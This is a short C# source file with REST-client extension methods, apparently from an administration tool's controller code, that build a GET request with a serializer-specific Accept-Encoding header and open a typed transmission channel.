using System.Net.Http;
using System.Net.Http.Headers;
using System.Threading;
using System.Threading.Tasks;
using Orcus.Administration.Library.Clients;
using Orcus.Administration.Library.Clients.Helpers;

namespace Orcus.Administration.ControllerExtensions
{
    public static class RestClientExtensions
    {
        private static string CombineUrlWithResource(string url, string resource)
        {
            if (resource == null)
                return url;
            return url + "/" + resource;
        }

        public static Task<CallTransmissionChannel<TChannel>> CreateChannel<TResource, TChannel>(this ITargetedRestClient restClient, string path,
            ObjectSerializer serializer) where TResource : IResourceId, new()
        {
            var request = new HttpRequestMessage(HttpMethod.Get, CombineUrlWithResource(new TResource().ResourceUri, path));
            request.Headers.AcceptEncoding.Add(new StringWithQualityHeaderValue(serializer.ToString().ToLowerInvariant()));

            return restClient.OpenChannel<CallTransmissionChannel<TChannel>>(request, CancellationToken.None);
        }

        public static Task<CallTransmissionChannel<TChannel>> CreateChannel<TResource, TChannel>(this ITargetedRestClient restClient, string path)
            where TResource : IResourceId, new() =>
            CreateChannel<TResource, TChannel>(restClient, path, ObjectSerializer.NetSerializer);
    }

    public enum ObjectSerializer
    {
        NetSerializer
    }
}